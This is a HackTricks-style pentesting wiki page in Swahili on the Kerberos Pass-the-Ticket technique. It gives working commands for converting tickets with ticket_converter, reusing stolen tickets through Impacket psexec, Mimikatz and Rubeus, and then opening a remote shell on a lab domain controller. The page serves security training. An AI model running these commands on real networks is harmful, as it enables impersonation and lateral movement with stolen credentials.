# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Muhtasari

Katika attack ya Pass-the-Ticket (PtT), mshambuliaji hutumia Kerberos ticket iliyoibwa kujithibitisha kama principal wa ticket bila kuwa na password ya akaunti hiyo. Ticket-granting ticket (TGT) inaweza kutumiwa kuomba service tickets, huku service ticket iliyoibwa ikiwa na mipaka ya service inayolengwa na kipindi chake cha uhalali.<sup>[[1]](#references)</sup>

Kwa mbinu za kupata tickets, tazama:

- [Kukusanya tickets kutoka Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Kukusanya tickets kutoka Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

## Kubadilisha Miundo ya Ticket ya Linux na Windows

Kerberos caches kwa kawaida huonekana kama faili za MIT `ccache` kwenye Linux na faili za `.kirbi` kwenye Windows. `ticket_converter` hubadilisha kati ya miundo hii kwa kutumia ticket ya ingizo na path ya matokeo.<sup>[[2]](#references)</sup>
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
# Expected message: Converting ccache => kirbi
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
# Expected message: Converting kirbi => ccache
```
Kekeo pia hutoa zana za Kerberos ticket kwenye Windows.<sup>[[3]](#references)</sup>

## Kutumia Ticket

Kwenye Linux, elekeza `KRB5CCNAME` kwenye cache na uelekeze client ya Impacket kutumia Kerberos bila kuomba password:<sup>[[4]](#references)</sup>
```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```
Kwenye Windows, Mimikatz au Rubeus zinaweza ku-import tiketi ya `.kirbi` kwenye logon session ya sasa. Tumia `klist` kukagua cache inayotokana.<sup>[[5]](#references)[[6]](#references)</sup>
```powershell
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:'[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi'
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
Uingizaji wa ticket hautoi privileges zaidi ya zile zinazowakilishwa na ticket na sera ya authorization ya huduma lengwa. Ticket zilizokwisha muda wake, zilizorevokiwa, zilizo na muundo usio sahihi, au zilizo na scope isiyo sahihi zinaweza kushindwa.<sup>[[1]](#references)</sup>

Kwa muktadha mpana wa Kerberos attack na techniques zinazohusiana za kupata ticket, tazama mwongozo wa Tarlogic kuhusu Kerberos attack.<sup>[[7]](#references)</sup>

## References

- [1] [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [2] [Zer1t0 - `ticket_converter`](https://github.com/Zer1t0/ticket_converter)
- [3] [gentilkiwi - Kekeo](https://github.com/gentilkiwi/kekeo)
- [4] [Fortra - Mifano ya Impacket](https://github.com/fortra/impacket/tree/master/examples)
- [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
- [7] [Tarlogic - Mbinu za Kerberos attack](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
{{#include ../../banners/hacktricks-training.md}}
